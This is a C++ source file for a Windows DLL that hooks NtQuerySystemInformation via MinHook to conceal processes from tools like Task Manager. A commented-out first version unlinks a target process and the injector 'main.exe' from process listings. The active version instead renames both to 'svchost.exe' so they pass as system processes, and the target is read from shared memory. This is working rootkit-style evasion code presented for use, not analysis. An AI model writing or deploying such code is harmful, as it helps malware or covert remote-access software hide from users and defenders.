// #include <Windows.h>
// #include <string.h>
// #include "..\include\MinHook.h"
// #include "nt_structs.h"

// #pragma comment(lib, "..\\include\\libMinHook.x64.lib")

// PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation = nullptr;
// PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation = nullptr;
// wchar_t* g_targetProcessName = nullptr;

// bool ImageNameMatches(const UNICODE_STRING* pName, const wchar_t* target) {
//     if (!pName || !pName->Buffer || !target) return false;
//     size_t targetLen = wcslen(target);
//     size_t nameLen = pName->Length / sizeof(WCHAR);
//     if (nameLen != targetLen) return false;
//     return _wcsnicmp(pName->Buffer, target, nameLen) == 0;
// }

// NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
//     SYSTEM_INFORMATION_CLASS SystemInformationClass,
//     PVOID SystemInformation,
//     ULONG SystemInformationLength,
//     PULONG ReturnLength)
// {
//     NTSTATUS status = New_NtQuerySystemInformation(
//         SystemInformationClass,
//         SystemInformation,
//         SystemInformationLength,
//         ReturnLength);

//     if (SystemInformationClass != SystemProcessInformation || !NT_SUCCESS(status))
//         return status;
//     if (!SystemInformation)
//         return status;

//     P_SYSTEM_PROCESS_INFORMATION pCurrent = (P_SYSTEM_PROCESS_INFORMATION)SystemInformation;
//     P_SYSTEM_PROCESS_INFORMATION pPrevious = nullptr;

//     while (true) {
//         bool hide = false;

//         if (pCurrent->ImageName.Buffer) {
//             // Hide the target process (e.g., notepad.exe) from Task Manager
//             if (g_targetProcessName && ImageNameMatches(&pCurrent->ImageName, g_targetProcessName)) {
//                 hide = true;
//             }
//             // Hide the injector itself from Task Manager
//             else if (ImageNameMatches(&pCurrent->ImageName, L"main.exe")) {
//                 hide = true;
//             }
//         }

//         if (hide) {
//             if (pPrevious) {
//                 if (pCurrent->NextEntryOffset == 0) {
//                     pPrevious->NextEntryOffset = 0;
//                     break;
//                 } else {
//                     pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
//                     pCurrent = (P_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pPrevious + pPrevious->NextEntryOffset);
//                     continue;
//                 }
//             }
//             // If it's the first node (System Idle Process), we can't unlink it,
//             // but it's never our target anyway.
//         } else {
//             pPrevious = pCurrent;
//         }

//         if (pCurrent->NextEntryOffset == 0)
//             break;

//         pCurrent = (P_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
//     }

//     return status;
// }

// bool set_nt_hook()
// {
//     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
//     if (!ntdll) return false;

//     Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");
//     if (!Original_NtQuerySystemInformation) return false;

//     if (MH_Initialize() != MH_OK) return false;
//     if (MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation,
//         (LPVOID*)&New_NtQuerySystemInformation) != MH_OK) return false;
//     if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) return false;

//     return true;
// }

// void get_process_name() {
//     HANDLE hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, "GetProcessName");
//     if (!hMap) return;

//     LPVOID buf = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 255);
//     if (!buf) {
//         CloseHandle(hMap);
//         return;
//     }

//     char* ansiName = (char*)buf;
//     if (ansiName[0] != '\0') {
//         int wideLen = MultiByteToWideChar(CP_UTF8, 0, ansiName, -1, nullptr, 0);
//         if (wideLen > 0) {
//             g_targetProcessName = (wchar_t*)malloc(wideLen * sizeof(wchar_t));
//             if (g_targetProcessName) {
//                 MultiByteToWideChar(CP_UTF8, 0, ansiName, -1, g_targetProcessName, wideLen);
//             }
//         }
//     }

//     UnmapViewOfFile(buf);
//     CloseHandle(hMap);
// }

// BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
// {
//     switch (fdwReason) {
//     case DLL_PROCESS_ATTACH:
//         DisableThreadLibraryCalls(hinstDLL);
//         get_process_name();   // Read target name from shared memory
//         set_nt_hook();        // Install hook
//         break;
//     case DLL_PROCESS_DETACH:
//         MH_DisableHook(Original_NtQuerySystemInformation);
//         MH_Uninitialize();
//         if (g_targetProcessName) {
//             free(g_targetProcessName);
//             g_targetProcessName = nullptr;
//         }
//         break;
//     }
//     return TRUE;
// }














#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <wchar.h>
#include "..\include\MinHook.h"
#include "nt_structs.h"

#pragma comment(lib, "..\\include\\libMinHook.x64.lib")

PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation = nullptr;
PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation = nullptr;
wchar_t* g_targetProcessName = nullptr;

// Fake Windows system process name — blends perfectly with real system processes
wchar_t g_fakeProcessName[32] = L"svchost.exe";

void DllLog(const char* fmt, ...) {
    char buf[512];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);

    FILE* f = nullptr;
    char path[MAX_PATH];
    ExpandEnvironmentStringsA("%TEMP%\\ProcessHider.log", path, MAX_PATH);
    fopen_s(&f, path, "a");
    if (f) {
        fprintf(f, "[PID:%lu] %s\n", GetCurrentProcessId(), buf);
        fclose(f);
    }
}

bool ImageNameMatches(const UNICODE_STRING* pName, const wchar_t* target) {
    if (!pName || !pName->Buffer || !target) return false;
    size_t targetLen = wcslen(target);
    size_t nameLen = pName->Length / sizeof(WCHAR);
    if (nameLen != targetLen) return false;
    return _wcsnicmp(pName->Buffer, target, nameLen) == 0;
}

// Overwrite the process name in-place with a fake system process name
void MasqueradeName(UNICODE_STRING* pName) {
    if (!pName || !pName->Buffer) return;

    size_t fakeLen = wcslen(g_fakeProcessName);
    size_t bufChars = pName->MaximumLength / sizeof(WCHAR);

    // Only overwrite if the buffer is large enough to hold the fake name
    if (bufChars >= fakeLen + 1) {
        memcpy(pName->Buffer, g_fakeProcessName, fakeLen * sizeof(WCHAR));
        pName->Buffer[fakeLen] = L'\0';
        pName->Length = (USHORT)(fakeLen * sizeof(WCHAR));
        pName->MaximumLength = (USHORT)((fakeLen + 1) * sizeof(WCHAR));
    }
}

NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status = New_NtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (SystemInformationClass != SystemProcessInformation || !NT_SUCCESS(status))
        return status;
    if (!SystemInformation)
        return status;

    P_SYSTEM_PROCESS_INFORMATION pCurrent = (P_SYSTEM_PROCESS_INFORMATION)SystemInformation;

    while (true) {
        if (pCurrent->ImageName.Buffer) {
            // Masquerade the target process (e.g., getscreen.exe)
            if (g_targetProcessName && ImageNameMatches(&pCurrent->ImageName, g_targetProcessName)) {
                MasqueradeName(&pCurrent->ImageName);
                DllLog("Masqueraded target PID:%lu as %ls",
                    (ULONG)(ULONG_PTR)pCurrent->UniqueProcessId, g_fakeProcessName);
            }
            // Masquerade the injector itself (main.exe)
            else if (ImageNameMatches(&pCurrent->ImageName, L"main.exe")) {
                MasqueradeName(&pCurrent->ImageName);
                DllLog("Masqueraded injector PID:%lu as %ls",
                    (ULONG)(ULONG_PTR)pCurrent->UniqueProcessId, g_fakeProcessName);
            }
        }

        if (pCurrent->NextEntryOffset == 0)
            break;

        pCurrent = (P_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
    }

    return status;
}

bool set_nt_hook()
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!Original_NtQuerySystemInformation) return false;

    if (MH_Initialize() != MH_OK) return false;
    if (MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation,
        (LPVOID*)&New_NtQuerySystemInformation) != MH_OK) return false;
    if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) return false;

    DllLog("Hook installed successfully");
    return true;
}

void get_process_name() {
    HANDLE hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, "GetProcessName");
    if (!hMap) {
        DllLog("OpenFileMappingA failed. Error: %lu", GetLastError());
        return;
    }

    LPVOID buf = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 255);
    if (!buf) {
        CloseHandle(hMap);
        DllLog("MapViewOfFile failed");
        return;
    }

    char* ansiName = (char*)buf;
    if (ansiName[0] != '\0') {
        int wideLen = MultiByteToWideChar(CP_UTF8, 0, ansiName, -1, nullptr, 0);
        if (wideLen > 0) {
            g_targetProcessName = (wchar_t*)malloc(wideLen * sizeof(wchar_t));
            if (g_targetProcessName) {
                MultiByteToWideChar(CP_UTF8, 0, ansiName, -1, g_targetProcessName, wideLen);
                DllLog("Target process to masquerade: %ls -> %ls", g_targetProcessName, g_fakeProcessName);
            }
        }
    } else {
        DllLog("Shared memory was empty");
    }

    UnmapViewOfFile(buf);
    CloseHandle(hMap);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);
        DllLog("DLL attached to PID:%lu", GetCurrentProcessId());
        get_process_name();
        set_nt_hook();
        break;
    case DLL_PROCESS_DETACH:
        DllLog("DLL detached");
        MH_DisableHook(Original_NtQuerySystemInformation);
        MH_Uninitialize();
        if (g_targetProcessName) {
            free(g_targetProcessName);
            g_targetProcessName = nullptr;
        }
        break;
    }
    return TRUE;
}